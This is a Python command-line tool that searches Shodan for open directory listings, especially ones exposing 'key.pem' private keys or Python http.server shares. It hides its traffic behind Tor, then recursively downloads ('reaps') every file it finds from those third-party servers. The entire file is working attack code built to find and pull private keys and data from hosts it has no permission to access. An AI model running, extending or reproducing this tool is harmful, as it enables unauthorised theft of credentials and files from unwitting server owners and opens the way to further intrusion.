#!/usr/bin/python3

import requests
import os
import argparse
from simple_term_menu import TerminalMenu
from time import sleep
from requests.exceptions import ConnectionError, Timeout, RequestException
from urllib3.exceptions import ConnectionError
from datetime import datetime

from src.do_setup import *
from src.do_keywords import *

now = datetime.now()
date_time = now.strftime("-%m-%d-%Y-%H:%M:%S")

TARGET_IPS = []


def do_request(reap, notor, ig_hist, port, targ):
    # Setup session
    s = requests.Session()
    pre = requests.get("http://icanhazip.com")
    print(f"Current External IP: {pre.content.decode()}", end="")
    if (notor == False):
        s.proxies.update({'http': 'socks5://127.0.0.1:9050'})
        post = s.get("http://icanhazip.com")
        print(f"TOR External IP: {post.content.decode()}", end="")
        if (post.content == pre.content):
            print("\nERR: With and without tor are same.")
            print("If you are not running tor specify -t")
            exit()

    if (targ == False):
        fp = open("result.txt", "r")
        targets = fp.readlines()
        fp.close()
    else:
        targets = []
        targets.append(targ)
    fp = open("history.txt", "r")
    history = fp.readlines()
    fp.close()
    w_history = open("history.txt", "w+")
    w_history.writelines(history)

    print("Current histfile:")
    lc = 0
    for ip in history:
        # If ip is too short add an extra tab
        if (len(ip) <= 8):
            ext = "\t"
        else:
            ext = ""

        if (lc == 3):
            print(f"{ip.strip()}\t{ext}\n", end="")
            lc = 0
        else:
            print(f"{ip.strip()}\t{ext}\n", end="")
            lc += 1
    for target in targets:
        try:
            if (target.strip() + "\n" not in history or ig_hist):
                r = s.get(f"http://{target.strip()}:{port}/", timeout=10)
                print(Fore.RESET + f"http://{target.strip()}:{port}/ --> Status Code: {r.status_code}")
                w_history.write(target.strip() + "\n")
                # will return bool True | False depending if key word was found
                key, find = key_words(r.content, target.strip())
                if ((key and reap) or (targ and reap)):
                    TARGET_IPS.append(target.strip() + " " + find)
                    print(f"{target.strip()} contains:")
                    #            print(r.content.decode().split("\n"))
                    for line in r.content.decode().split("\n"):
                        if ("<a href=\"" in line):
                            file = line.split("href=\"")[1].split("\"")[0]
                            print("\t" + file)
        except (ConnectionError, Timeout, RequestException):
            print(Fore.RED + f"{target.strip()}, is not responsive")
    w_history.close()
    reap_menu(s, port)


def reap_menu(s, port):
    TARGET_IPS.append(" - END HARVEST")
    while True:
        os.system("clear")
        print("Which soul would you like to reap?")
        menu = TerminalMenu(TARGET_IPS)
        selection = menu.show()
        if selection == len(TARGET_IPS) - 1:
            break
        target = TARGET_IPS[selection].split(' ')[0]
        os.system("clear")

        try:
            r = s.get(f"http://{target.strip()}:{port}/", timeout=10)

            print(f"{target.strip()} contains:")
            print(Fore.RESET + f"http://{target.strip()}:{port}/ --> Status Code: {r.status_code}")
            # print(r.content.decode().split("\n"))
            for line in r.content.decode().split("\n"):
                if ("<a href=\"" in line):
                    file = line.split("href=\"")[1].split("\"")[0]
                    print("\t" + file)
            while True:
                user_in = input("(R)eap/(A)sk/(Q)back > ")
                user_in = user_in.lower()
                if (user_in not in ['r', 'a', 'q']):
                    print("--- Invalid Input ---")
                else:
                    break

            if user_in == 'r':
                harvest(s, target, r.content.decode(), "/", True, port)
            elif user_in == 'a':
                harvest(s, target, r.content.decode(), "/", False, port)
            elif user_in == 'q':
                continue


        except (ConnectionError, Timeout, RequestException):
            print(Fore.RED + f"{target}, is not responsive")

    # Harvest with questions
    # harvest(s,target.strip(),r.content.decode(),"/",False,port)
    # Harvest without asking questions except file size warnings
    # harvest(s,target.strip(),r.content.decode(),"/",True,port)


def harvest(s, ip, content, working_file, X, port):
    if (X == False and working_file != "/"):
        print(f"\nDir: {working_file} contains:")
        for line in content.split("\n"):
            if ("<a href=\"" in line):
                file = line.split("href=\"")[1].split("\"")[0]
                print("\t" + file)

        harvest_dir = input(Fore.RESET + "\nWould you like to reap (Y/n/cancel)> ")
        if (harvest_dir.upper() != "Y"):
            return
        if (harvest_dir.upper() == "CANCEL"):
            working_file = "/" + working_file.split("/")[1]

    if not os.path.exists(ip + working_file):
        os.makedirs(ip + working_file)
    for line in content.split("\n"):
        if ("<a href=\"" in line):
            file = line.split("href=\"")[1].split("\"")[0]
            if ("/" in file):
                print("Crawling: " + working_file + file)
                rep = s.get(f"http://{ip}:{port}{working_file}{file}")
                harvest(s, ip, rep.content.decode(), working_file + file, X, port)
                if not os.path.exists(ip + working_file + file):
                    os.makedirs(ip + working_file + file)
            else:
                lf = False
                hd = s.head(f"http://{ip}:{port}{working_file}{file}")
                hdr = hd.headers
                if (int(hdr['Content-Length']) > 5000000):
                    lf = True
                    print(Fore.RED + f"Warning: {file} is large ({hdr['Content-Length']} Bytes)")
                    dl = input(Fore.RESET + "Proceed with download? (Y/n)> ")
                if (lf and dl.upper() == "N"):
                    print(f"Aborting download on {file}")
                else:
                    print(f"Getting: {file} Size: {hdr['Content-Length']}")
                    rep = s.get(f"http://{ip}:{port}{working_file}{file}", stream=True, timeout=30)
                    w_file = open(f"{ip}{working_file}{file}", 'wb')
                    w_file.write(rep.content)
                    w_file.close()


if __name__ == "__main__":
    # print the banner
    banner()
    notor = False
    parser = argparse.ArgumentParser(
        prog='Data Scraper',
        description='Querys shodan for indexable http servers',
        epilog='Made by Aznable and ice-wzl')
    parser.add_argument('-q', '--query', action='store_true', help="Conduct shodan query and update result.txt")
    parser.add_argument('-s', '--scan', action='store_true',
                        help="Conduct scans and enumeration of targets in result.txt")
    parser.add_argument('-r', '--reap', action='store_true', help="If positive enumeration reap all files from target")
    parser.add_argument('-x', '--full', action='store_true', help="Full send it all")
    parser.add_argument('-n', '--notor', action='store_true', help="Dont use tor")
    parser.add_argument('-i', '--ig_hist', action='store_true', help="Ignore history file")
    parser.add_argument('-p', '--port', help="Specify port number (Default 8000)")
    parser.add_argument('-t', '--target', help="Specify a target to Scan/Reap")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-K', '--key', action='store_true', help='conduct query for exposed .pem files')
    group.add_argument('-P', '--python', action='store_true', help='conduct query for exposed python http.servers')

    args = parser.parse_args()

    # conduct the shodan query to get the results
    if len(sys.argv) == 2:
        parser.print_help()
        sys.exit(1)
    reap = (args.reap or args.full)
    if (args.key):
        if (args.query or args.full):
            if (args.port):
                do_query(setup_api(), f'http.title:"Index of /" http.html:"key.pem", port:{args.port}')
            else:
                do_query(setup_api(), 'http.title:"Index of /" http.html:"key.pem", port:80')
        sleep(1.0)

        if (args.target):
            if (args.port):
                do_request(args.reap, args.notor, True, args.port, args.target)
            else:
                do_request(args.reap, args.notor, True, "80", args.target)

        if (args.scan or args.full):
            if (args.port):
                do_request(args.reap, args.notor, args.ig_hist, args.port, False)
            else:
                do_request(args.reap, args.notor, args.ig_hist, "80", False)

    elif (args.python):
        if (args.query or args.full):
            if (args.port):
                do_query(setup_api(), f'Title:"Directory listing for /" port:{args.port}')
            else:
                do_query(setup_api(), 'Title:"Directory listing for /" port:8000')
            sleep(1.0)
        # perform the requests which will loop through the results in results.txt
        if (args.target):
            if (args.port):
                do_request(args.reap, args.notor, True, args.port, args.target)
            else:
                do_request(args.reap, args.notor, True, "8000", args.target)

        if (args.scan or args.full):
            if (args.port):
                do_request(args.reap, args.notor, args.ig_hist, args.port, False)
            else:
                do_request(args.reap, args.notor, args.ig_hist, "8000", False)